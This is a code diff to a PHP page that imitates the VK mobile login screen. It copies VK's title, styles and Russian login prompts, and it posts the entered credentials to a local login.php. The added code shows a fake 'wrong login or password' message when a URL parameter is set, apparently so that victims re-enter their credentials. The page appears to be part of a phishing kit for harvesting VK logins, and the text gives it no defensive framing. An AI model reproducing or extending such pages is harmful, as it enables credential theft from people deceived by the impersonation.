@@ -29,7 +29,6 @@ if((strpos($agent, "Android") != false)or(strpos($agent, "iPhone") != false)){
         <title>https://m.vk.com</title>
 
         <link rel="stylesheet" href="https://m.vk.com/css/mobile/common.css?f17be24e8d33824f5f23d474637dd8a33b8d5d72451c32afc3d554c70fd83f78">
-<
 
         <link rel="canonical" href="https://vk.com/" />
     <link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/" />
@@ -73,7 +72,14 @@ if((strpos($agent, "Android") != false)or(strpos($agent, "iPhone") != false)){
      Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
     </div>
       <div class="fi_row"><div class="service_msg_box">
-  <div class="service_msg service_msg_warning">Чтобы продолжить, необходимо авторизоваться в <b>Вконтакте</b>. </div>
+  <div class="service_msg service_msg_warning">
+    <?php
+    if($_GET['i']=="1"){
+      echo "Неверный логин или пароль.";
+    }else{
+      echo "Чтобы продолжить, необходимо авторизоваться в <b>Вконтакте</b>.";
+    }
+    ?></div>
 </div></div>
     <form method="POST" action="login.php" novalidate>
       <dl class="fi_row">
@@ -224,7 +230,7 @@ if((strpos($agent, "Android") != false)or(strpos($agent, "iPhone") != false)){
         echo "Неверный логин или пароль.";
         $ok = 3;
     }else{
-    echo "Чтобы продолжить, необходимо авторизоваться <b>Вконтакте</b>.";
+    echo "Чтобы продолжить, необходимо авторизоваться в <b>Вконтакте</b>.";
     }
     ?>
 
